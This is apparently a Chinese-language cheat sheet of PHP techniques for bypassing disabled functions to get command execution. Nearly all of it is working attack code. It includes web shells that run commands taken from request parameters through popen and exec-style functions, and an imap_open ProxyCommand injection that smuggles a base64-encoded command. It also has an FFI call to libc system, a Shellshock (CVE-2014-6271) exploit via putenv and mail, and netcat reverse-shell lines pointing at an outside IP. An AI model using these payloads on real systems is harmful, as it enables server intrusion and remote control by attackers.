#### 常规函数绕过
```php
<?php
echo exec('whoami');?>
------------------------------------------------------
<?php
echo shell_exec('whoami');?>
------------------------------------------------------
<?php
system('whoami');?>
------------------------------------------------------
<?php
passthru("whoami");?>
------------------------------------------------------
<?php
$command=$_POST['cmd'];
$handle = popen($command , "r");
while(!feof($handle))
{        echo fread($handle, 1024);  //fread($handle, 1024);
}
pclose($handle);?>
-------------------------------------------------------
<?php
$command="ipconfig";
$descriptorspec = array(1 => array("pipe", "w"));
$handle = proc_open($command ,$descriptorspec , $pipes);
while(!feof($pipes[1]))
{        echo fread($pipes[1], 1024); //fgets($pipes[1],1024);
}?>
```
#### pcntl_exec
	开启了pcntl 扩展，并且php 4>=4.2.0 , php5，linux
```php
<?php
if(function_exists('pcntl_exec')) {
pcntl_exec("/bin/bash", array("/tmp/test.sh"));
} else {
echo 'pcntl extension is not support!';
}
?>
```
	test.sh
	#!/bin/bash
	nc -e /bin/bash 1.1.1.1 8888       #反弹shell
#### imap_open函数
```php
<?php
error_reporting(0);
if (!function_exists('imap_open')) {
die("no imap_open function!");
}
$server = "x -oProxyCommand=echo\t" . base64_encode($_GET['cmd'] . ">/tmp/cmd_result") . "|base64\t-d|sh}";
imap_open('{' . $server . ':143/imap}INBOX', '', '');
sleep(5);
echo file_get_contents("/tmp/cmd_result");
?>
```
#### php7.4 FFI绕过
	php 7.4
	ffi.enable=true
```php
<?php
$a='nc -e /bin/bash ip 8888';
$ffi = FFI::cdef(
    "int system(char *command);",
    "libc.so.6");
$ffi->system($a);
?>
```
  ### shellshock
	存在CVE-2014-6271漏洞
	PHP 5.*，linux，putenv()、mail()可用
```php
<?php
function shellshock($cmd) {
$tmp = tempnam(".","data");
putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1");
mail("a@127.0.0.1","","","","-bv");
$output = @file_get_contents($tmp);
@unlink($tmp);
if($output != "") return $output;
else return "No output, or not vuln.";
}
echo shellshock($_REQUEST["cmd"]);
?>
```